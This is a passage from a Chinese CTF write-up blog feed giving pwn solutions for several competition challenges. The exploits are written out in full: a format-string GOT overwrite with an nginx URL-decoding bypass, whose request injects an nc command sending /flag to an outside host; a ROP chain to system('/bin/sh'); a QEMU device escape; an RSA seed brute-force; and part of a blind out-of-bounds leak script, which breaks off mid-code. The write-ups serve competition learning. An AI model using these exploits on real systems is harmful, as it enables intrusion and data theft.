id="分析-2">分析</h3><p><img src="/img/blog_img/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/hardgateway-1.png" srcset="/img/loading.gif" lazyload alt="" title="启用的防护"></p><p><img src="/img/blog_img/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/hardgateway.png" srcset="/img/loading.gif" lazyload alt="" title="主要代码"></p><p>当使用GET方式访问时，会检测<code>X-Forwarded-For</code>头是否为127.0.0.1，并检测访问的url是否为/cgi-bin/note_handler<br>之后会获取两个参数<code>action</code>与<code>content</code>,在处理<code>content</code>参数的代码中c代码存在一定的误导性，<code>snprintf</code>函数的定义为<code>snprintf(char *dest,size_t size,char *format,...)</code>,所以传入的<code>content</code>参数实际上是被用于格式化字符串了</p><p>因为程序没有开启PIE保护,经过逆向发现<code>puts,system,strncpy</code>在进行格式化字符串时没有绑定,所以可以尝试将<code>puts</code>对应got表项修改为<code>system</code>,不过因为<code>v14</code>变量的大小为0x90,且程序开启了Canary保护,所以无法通过响应包获取flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">    location /cgi-bin/note_handler &#123;<br>        internal;<br>        proxy_set_header X-Forwarded-For <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br>        proxy_pass http:<span class="hljs-comment">//127.0.0.1;</span><br>    &#125;<br>    location /cgi-bin/ &#123;<br>        <span class="hljs-keyword">if</span> ($uri = <span class="hljs-string">&quot;/cgi-bin/note_handler&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">403</span>;<br>        &#125;<br>        expires +<span class="hljs-number">1</span>h;<br>        limit_rate <span class="hljs-number">10</span>k;<br>        root /usr/share;<br>        fastcgi_pass unix:/var/run/fcgiwrap.socket;<br>        fastcgi_index /cgi-bin/http;<br>        include /etc/nginx/fastcgi_params;<br>        #fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;<br>        fastcgi_param SCRIPT_FILENAME $document_root/cgi-bin/http;<br>    &#125;<br></code></pre></td></tr></table></figure><p>分析nginx的配置文件,无法直接访问<code>/cgi-bin/note_handler</code>,但因为程序中对访问路径进行了再一次的url解码,所以可以使用<code>/cgi-bin/%256eote_handler</code>进行绕过</p><h3 id="exp-2">exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;&quot;&quot;GET /cgi-bin/%256eote_handler?action=add,print&amp;content=%192c(@@&amp;content=%176c%34$hhn&amp;content=nc 192.168.158.128 4444 &lt; /flag; HTTP/1.1</span><br><span class="hljs-string">Host: 192.168.158.128:8088</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">X-Forwarded-For: 127.0.0.1</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">  </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> gzip<br><span class="hljs-keyword">import</span> socket<br>s=socket.socket()<br>s.connect((<span class="hljs-string">&quot;192.168.158.128&quot;</span>,<span class="hljs-number">8088</span>))<br>s.send(a)<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/hardgateway-2.png" srcset="/img/loading.gif" lazyload alt=""></p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第六届大学生浙江省网络安全大赛决赛-pwn</title>
    <link href="/page/wp/%E7%AC%AC%E5%85%AD%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-PWN/"/>
    <url>/page/wp/%E7%AC%AC%E5%85%AD%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-PWN/</url>
    
    <content type="html"><![CDATA[<h2 id="SafeNote">SafeNote</h2><p>主要就是一个<code>rsa</code>加密，不过程序使用伪随机数构造<code>rsa</code>的公钥密钥，所以本地可以通过伪随机数获取目标程序上的公钥密钥，用于解密<code>password</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">python里面没有会用的数学模块，只能仿造程序用gmp进行rsa解密</span><br><span class="hljs-comment">gcc 1.c -o a.out -lgmp</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;gmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">gmp_randstate_t</span> gmp_state;<br>__mpz_struct p,q,n_,e,p_1,q_1,lambda,d_;<br>__mpz_struct secret,msg;<br><span class="hljs-type">char</span>* data,data1;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>data=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>data1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2000</span>);<br>__gmpz_inits(&amp;p,&amp;q,&amp;n_,&amp;e,&amp;p_1,&amp;q_1,&amp;lambda,&amp;d_,&amp;secret,&amp;msg,<span class="hljs-number">0</span>);<br>__gmp_randinit_mt(&amp;gmp_state);<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;num);<br>__gmp_randseed_ui(&amp;gmp_state,time(<span class="hljs-number">0</span>)+num);<br><span class="hljs-comment">// 比赛的靶机时间跟本地不同，需要爆破</span><br>__gmpz_urandomb(&amp;q,&amp;gmp_state,<span class="hljs-number">256</span>);<br>__gmpz_nextprime(&amp;q,&amp;q);<br>__gmpz_urandomb(&amp;p,&amp;gmp_state,<span class="hljs-number">256</span>);<br>__gmpz_nextprime(&amp;p,&amp;p);<br> __gmpz_mul(&amp;n_, &amp;p, &amp;q);<br>  __gmpz_set_ui(&amp;e, <span class="hljs-number">65537LL</span>);<br>  __gmpz_sub_ui(&amp;p_1, &amp;p, <span class="hljs-number">1LL</span>);<br>  __gmpz_sub_ui(&amp;q_1, &amp;q, <span class="hljs-number">1LL</span>);<br>  __gmpz_lcm(&amp;lambda, &amp;p_1, &amp;q_1);<br>  __gmpz_invert(&amp;d_, &amp;e, &amp;lambda);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;n: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;n_));<br>read(<span class="hljs-number">0</span>,data,<span class="hljs-number">0x100</span>);<br>__gmpz_set_str(&amp;secret,data,<span class="hljs-number">10</span>);<br>__gmpz_powm(&amp;msg,&amp;secret,&amp;d_,&amp;n_);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: %s\n&quot;</span>,__gmpz_get_str(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;msg));<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> CDLL<br><br>lib=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>p=process(<span class="hljs-string">&quot;SafeNote&quot;</span>)<br>i=<span class="hljs-number">96</span><br><span class="hljs-keyword">while</span> i&gt;<span class="hljs-number">0</span>:<br>    p=remote(<span class="hljs-string">&quot;10.1.101.234&quot;</span>,<span class="hljs-number">9999</span>)<br>    t=lib.time(<span class="hljs-number">0</span>)<br>    p1=process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>    p1.sendline(<span class="hljs-built_in">str</span>(i))<br>    p.readuntil(<span class="hljs-string">&quot;N =&quot;</span>)<br>    d2=<span class="hljs-built_in">int</span>(p.readline())<br>    p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&quot;password = &quot;</span>)<br>    d=<span class="hljs-built_in">int</span>(p.readline().strip().decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    p1.send(<span class="hljs-built_in">str</span>(d))<br>    p1.readuntil(<span class="hljs-string">&#x27;n:&#x27;</span>)<br>    d1=<span class="hljs-built_in">int</span>(p1.readline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).strip())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(1): &quot;</span>+<span class="hljs-built_in">str</span>(d2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n(2): &quot;</span>+<span class="hljs-built_in">str</span>(d1))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nu: &quot;</span>+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &quot;</span>+<span class="hljs-built_in">str</span>(t))<br>    <span class="hljs-keyword">if</span> d2!=d1:<br>        p.close()<br>        p1.close()<br>        i-=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br>p1.readuntil(<span class="hljs-string">&#x27;data:&#x27;</span>)<br>d=p1.readline()<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-comment"># 不知道为什么脚本直接发送password无法获取flag，所以需要手动发送</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ropexam">ropexam</h2><p>在<code>message</code>中可以泄露栈地址，之后在栈地址中迁移栈，再利用<code>read</code>构造<code>rdx</code>，之后执行<code>write</code>就可以泄露<code>libc</code>地址了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">two</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt; &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&quot;message: &quot;</span>,data)<br>    <span class="hljs-keyword">pass</span><br><br>main=<span class="hljs-number">0x4014d6</span><br>read=<span class="hljs-number">0x401465</span><br>show=<span class="hljs-number">0x4014c2</span><br>show_=<span class="hljs-number">0x4014bf</span><br>pop_rbp=<span class="hljs-number">0x00000000004012dd</span><br>leave=<span class="hljs-number">0x4014d4</span><br>ret=<span class="hljs-number">0x4014d5</span><br><br>libc=ELF(<span class="hljs-string">&quot;./lib&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./ropexam&quot;</span>)<br><br>two(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br>rbp=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>rsp=rbp-<span class="hljs-number">0x20</span><br>info(<span class="hljs-string">f&quot;stack: 0x<span class="hljs-subst">&#123;rsp:08x&#125;</span>&quot;</span>)<br><br>payload=flat([rsp-<span class="hljs-number">0x20</span>,read,\<br>              rsp-<span class="hljs-number">0x20</span>,leave])<br>two(payload)<br><br>p.read()<br><br>payload=flat(&#123;<span class="hljs-number">0</span>:[rsp,ret,main,\<br>        pop_rbp,rsp+<span class="hljs-number">0x10</span>,\<br>        show_],<span class="hljs-number">0x40</span>:[rsp-<span class="hljs-number">0x30</span>,leave]&#125;)<br><br>p.send(payload)<br>p.read(<span class="hljs-number">0x28</span>)<br><br>libc_start=u64(p.read(<span class="hljs-number">8</span>))<br>libc.address=libc_start-<span class="hljs-number">0x29d90</span><br>info(<span class="hljs-string">f&quot;libc_address: 0x<span class="hljs-subst">&#123;libc.address:08x&#125;</span>&quot;</span>)<br><br>rdi=libc.address+<span class="hljs-number">0x000000000002a3e5</span><br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>two(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system))<br>p.read()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="easyqemu">easyqemu</h2><p>在<code>dasctf_mmio_read</code>与<code>dasctf_mmio_write</code>中没有限制写入或读取的偏移范围，导致可以获取<code>qemu_system</code>程序的基地址，然后就可以利用<code>dasctf_pmio_write</code>执行<code>system(&quot;cat flag&quot;)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> *addr, <span class="hljs-type">uint64_t</span> val)</span><br>&#123;<br>    *addr = val;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> *addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *addr;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> port, <span class="hljs-type">uint64_t</span> val)</span><br>&#123;<br>    outl(val, port);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> port)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(port);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *message)</span>&#123;<br><span class="hljs-built_in">puts</span>(message);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span>  mmio_addr;<br>    <span class="hljs-type">int</span>   mmio_fd;<br>    <span class="hljs-type">uint64_t</span>  val;<br>    <span class="hljs-type">char</span> bin_sh[<span class="hljs-number">0x20</span>]=<span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,<br>            O_RDWR | O_SYNC);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open mmio file! wrong path or no root?&quot;</span>);<br>    &#125;<br><br>    mmio_addr = (<span class="hljs-type">uint64_t</span>)<br>            mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_addr == MAP_FAILED) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to mmap mmio space!&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">uint32_t</span>  pmio_port = <span class="hljs-number">0xc050</span>;<br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)&lt;<span class="hljs-number">0</span>)&#123;<br>errExit(<span class="hljs-string">&quot;failed to change i/o privilege! no root?&quot;</span>);<br>    &#125;<br>    <span class="hljs-type">uint64_t</span> opaque=mmio_read(mmio_addr+<span class="hljs-number">0x170</span>);<br>    <span class="hljs-type">uint64_t</span> buf=opaque+<span class="hljs-number">0xa30</span>;<br>    <span class="hljs-type">uint64_t</span> qemu_system=mmio_read(mmio_addr+<span class="hljs-number">0x198</span>)<span class="hljs-number">-0x844B35</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;qemu_system base address: %p\n&quot;</span>,qemu_system);<br>    <span class="hljs-type">uint64_t</span> system_=qemu_system+<span class="hljs-number">0x315760</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;to call system(\&quot;/bin/sh\&quot;)\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(bin_sh,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(bin_sh,<span class="hljs-string">&quot;cat flag&quot;</span>,<span class="hljs-number">8</span>);<br>    mmio_write(mmio_addr,*(<span class="hljs-type">uint64_t</span>*)bin_sh);<br>    mmio_write(mmio_addr+<span class="hljs-number">8</span>,<span class="hljs-number">0</span>);<br>    mmio_write(mmio_addr+<span class="hljs-number">0x100</span>,system_);<br>    pmio_write(pmio_port,<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ACTF2023-PWN</title>
    <link href="/page/wp/ACTF2023-PWN/"/>
    <url>/page/wp/ACTF2023-PWN/</url>
    
    <content type="html"><![CDATA[<h2 id="blind">blind</h2><p>这是我做的第一道盲打的pwn题，感觉主要就是需要泄露信息，能够泄露信息之后就好做了</p><p>在这道题目中,存在数组越界,并且指向数组的指针就在数组后面,所以可以通过修改数组指针来达到信息泄露以及任意地址写的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">泄露程序内容</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>debug=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">p,data</span>):<br>    p.sendline(data)<br>    d=p.readuntil(<span class="hljs-string">b&#x27;\n&gt;&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">if</span> debug:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i:02x&#125;</span> &quot;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;: %s&quot;</span>%d)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(d))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> u64(d)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> d<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">ind</span>):<br>    cache=<span class="hljs-string">&quot;&quot;</span><br>    n=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p=remote(<span class="hljs-string">&quot;120.46.65.156&quot;</span>,<span class="hljs-string">&quot;32104&quot;</span>)<br>        p.readuntil(<span class="hljs-string">b&quot;submit.&quot;</span>)<br>        p.readuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>        stack=send(p,<span class="hljs-string">b&quot;8d8w&quot;</span>)<br>        elf=send(p,<span class="hljs-string">b&quot;8a8w8a&quot;</span>)+ind<br>        success(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;elf=:x&#125;</span>   <span class="hljs-subst">&#123;stack=:x&#125;</span>&quot;</span>)<br>        stack=stack+<span class="hljs-number">8</span><br>        code=<span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            sc=(stack&gt;&gt;(i*<span class="hljs-number">8</span>))&amp;<span class="hljs-number">0xff</span><br>            ec=(elf&gt;&gt;(i*<span class="hljs-number">8</span>))&amp;<span class="hljs-number">0xff</span><br>            <span class="hljs-keyword">if</span> sc&gt;ec:<br>                code+=<span class="hljs-string">&quot;%ss1d&quot;</span>%(sc-ec)<br>            <span class="hljs-keyword">elif</span> sc&lt;ec:<br>                code+=<span class="hljs-string">&quot;%sw1d&quot;</span>%(ec-sc)<br>            <span class="hljs-keyword">else</span>:<br>                code+=<span class="hljs-string">&#x27;1d&#x27;</span><br>        data=send(p,code.encode())<br>        p.close()<br>        <span 